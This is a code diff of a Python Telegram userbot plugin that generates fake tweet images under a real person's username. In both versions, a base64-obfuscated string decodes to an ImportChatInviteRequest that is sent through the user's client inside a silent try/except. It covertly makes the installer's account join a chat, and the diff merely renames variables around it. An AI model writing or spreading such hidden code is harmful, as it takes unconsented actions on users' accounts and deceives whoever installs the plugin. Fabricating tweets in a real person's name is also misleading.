@@ -159,8 +159,8 @@ async def miatweet(text):
         r = requests.get(
             f"https://nekobot.xyz/api/imagegen?type=tweet&text={text}&username=miakhalifa").json()
         wew = r.get("message")
-        hburl = url(wew)
-        if not hburl:
+        curl = url(wew)
+        if not curl:
             return  "check syntax once more"
         with open("temp.png", "wb") as f:
             f.write(requests.get(wew).content)
@@ -186,8 +186,8 @@ async def nekobot(borg):
             return
     await borg.edit("Requesting Mia to tweet...")
     try:
-        hell = str( pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
-        await borg.client(hell)
+        cat = str( pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
+        await borg.client(cat)
     except:
         pass   
     text = deEmojify(text)
